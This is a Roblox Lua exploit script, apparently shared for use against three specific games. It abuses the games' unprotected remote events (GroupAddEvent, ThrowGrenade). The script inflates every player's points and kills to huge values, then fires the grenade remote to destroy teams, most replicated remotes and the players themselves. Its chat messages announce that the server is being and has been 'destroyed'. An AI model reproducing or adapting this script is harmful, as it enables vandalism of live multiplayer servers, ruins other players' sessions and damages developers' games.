if game.PlaceId == 11698235691 or game.PlaceId == 11940161478 or game.PlaceId == 12015736082 then
local properties = {
   Color = Color3.new(12, 255, 0);
   Font = Enum.Font.FredokaOne;
   TextSize = 16;
}
wait(1)
properties.Text = "Made by Gerashino#8015"
game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
properties.Text = "Destroying Server..."
game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
wait(1)
for _,plr in pairs(game.Players:GetPlayers()) do
local points = {
    [1] = plr.leaderstats.Point,
    [2] = 999999999999999
}
game:GetService("ReplicatedStorage").GroupAddEvent:FireServer(unpack(points))
end
for _,plr in pairs(game.Players:GetPlayers()) do
local kills = {
    [1] = plr.leaderstats.Kill,
    [2] = 999999999999999
}
game:GetService("ReplicatedStorage").GroupAddEvent:FireServer(unpack(kills))
end
for _,plr in pairs(game.Players:GetPlayers()) do
local groupid = {
    [1] = plr.leaderstats.GroupId,
    [2] = math.huge
}
game:GetService("ReplicatedStorage").GroupAddEvent:FireServer(unpack(groupid))
end
wait(1)
for _,t in pairs(game.Teams:GetChildren()) do
local teams = {
    [1] = nil,
    [2] = nil,
    [3] = nil,
    [4] = false,
    [5] = t,
    [6] = 0
}
game:GetService("ReplicatedStorage").ThrowGrenade:FireServer(unpack(teams))
end
wait(1)
for _,r in pairs(game.ReplicatedStorage:GetChildren()) do
if game.ReplicatedStorage.DefaultChatSystemChatEvents.Name ~= r.Name and game.ReplicatedStorage.GroupAddEvent.Name ~= r.Name and game.ReplicatedStorage.ThrowGrenade.Name ~= r.Name then
local remotes = {
    [1] = nil,
    [2] = nil,
    [3] = nil,
    [4] = false,
    [5] = r,
    [6] = 0
}
game:GetService("ReplicatedStorage").ThrowGrenade:FireServer(unpack(remotes))
end
end
wait(1)
for _,p in pairs(game.Players:GetPlayers()) do
local players = {
    [1] = nil,
    [2] = nil,
    [3] = nil,
    [4] = false,
    [5] = p,
    [6] = 0
}
game:GetService("ReplicatedStorage").ThrowGrenade:FireServer(unpack(players))
end
wait(1)
properties.Text = "The server has been successfully destroyed!"
game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
end
